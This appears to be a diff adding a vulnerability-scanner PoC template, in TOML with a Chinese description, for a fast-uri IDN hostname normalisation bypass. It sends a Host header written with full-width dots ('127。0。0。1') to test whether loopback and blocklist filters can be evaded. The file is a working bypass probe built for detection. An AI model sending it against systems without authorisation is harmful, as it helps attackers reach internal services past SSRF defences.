@@ -1,0 +1,32 @@
+[info]
+author = "ave"
+description = "验证目标是否使用fast-uri库解析URL并存在IDN主机名规范化绕过。通过发送包含全角字符主机名（如http://127。0。0。1/）的HTTP请求，检测fast-uri与Node原生URL解析器之间的主机解析差异，确认能否绕过基于主机名的安全策略（黑名单、环回过滤、重定向验证等）。"
+id = "POC-AVE-2026-0241"
+name = "fast-uri IDN主机名规范化绕过 PoC"
+severity = "high"
+tags = ["ave-2026-0241"]
+vuln_id = [
+    "CVE-2026-13676",
+    "AVE-2026-0241",
+]
+
+[poc]
+logic = "any"
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}"
+protocol = "http"
+
+[poc.requests.headers]
+Host = "127。0。0。1"
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "127.0.0.1",
+    "localhost",
+]
